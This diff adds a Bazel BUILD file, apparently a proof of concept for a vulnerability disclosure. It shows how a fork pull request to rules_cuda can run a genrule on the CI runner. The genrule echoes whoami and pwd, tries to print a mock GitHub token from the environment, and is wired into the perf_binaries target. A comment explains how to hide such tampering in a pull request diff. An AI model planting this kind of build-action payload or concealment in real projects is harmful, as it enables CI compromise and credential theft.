@@ -1,0 +1,61 @@
+# This file stands in for examples/nccl/BUILD.bazel in the real
+# bazel-contrib/rules_cuda repository (fetched and confirmed 2026-08-12,
+# default branch `main`), which currently defines exactly these two real
+# targets:
+#
+#   filegroup(
+#       name = "nccl_shared",
+#       srcs = ["@nccl//:nccl_shared"],
+#   )
+#
+#   filegroup(
+#       name = "perf_binaries",
+#       srcs = [
+#           "@nccl-tests//:all_gather_perf",
+#           ... (8 more @nccl-tests//:*_perf targets)
+#       ],
+#   )
+#
+# `@nccl` / `@nccl-tests` are fetched via `http_archive` with pinned
+# `sha256` + `urls` in examples/WORKSPACE.bzlmod -- an attacker CANNOT
+# tamper with the fetched upstream NCCL source itself this way. However,
+# both `http_archive()` calls supply a custom `build_file` overlay
+# (`@rules_cuda_examples//nccl:nccl.BUILD` and
+# `@rules_cuda_examples//nccl:nccl-tests.BUILD`), and this
+# examples/nccl/BUILD.bazel file itself is a normal file inside the
+# attacker's own fork PR -- 100% attacker-controlled, and a direct,
+# transitive dependency of the exact `perf_binaries` target the real
+# workflow builds. An attacker does not even need to touch the
+# http_archive-fetched sources or their BUILD-file overlays: adding a new
+# target here, wired into `perf_binaries`'s dependency graph, is
+# sufficient (as demonstrated below).
+
+filegroup(
+    name = "nccl_shared",
+    srcs = ["evil_marker.txt"],
+)
+
+genrule(
+    name = "evil_marker",
+    outs = ["evil_marker.txt"],
+    cmd = """
+echo "=== ATTACKER-CONTROLLED BUILD ACTION EXECUTING ON THE CI RUNNER ===" >&2
+echo "(this genrule was added to examples/nccl/BUILD.bazel -- the REAL" >&2
+echo "file that defines the perf_binaries target the real workflow builds)" >&2
+echo "whoami: $$(whoami), pwd: $$(pwd)" >&2
+echo "Attempting to read MOCK_GITHUB_TOKEN from process environment:" >&2
+echo "MOCK_GITHUB_TOKEN=$${MOCK_GITHUB_TOKEN:-<not inherited into bazel genrule sandbox by default>}" >&2
+echo "ok" > $@
+""",
+)
+
+# perf_binaries is redefined here to depend on the malicious genrule above,
+# modeling how an attacker would wire their payload into the exact target
+# `bazelisk build ... @rules_cuda_examples//nccl:perf_binaries` resolves.
+# In a real attack, the attacker would instead leave the real srcs list
+# intact and simply ADD the malicious dependency alongside it, so the
+# tampering is less conspicuous in the PR diff.
+filegroup(
+    name = "perf_binaries",
+    srcs = [":evil_marker"],
+)
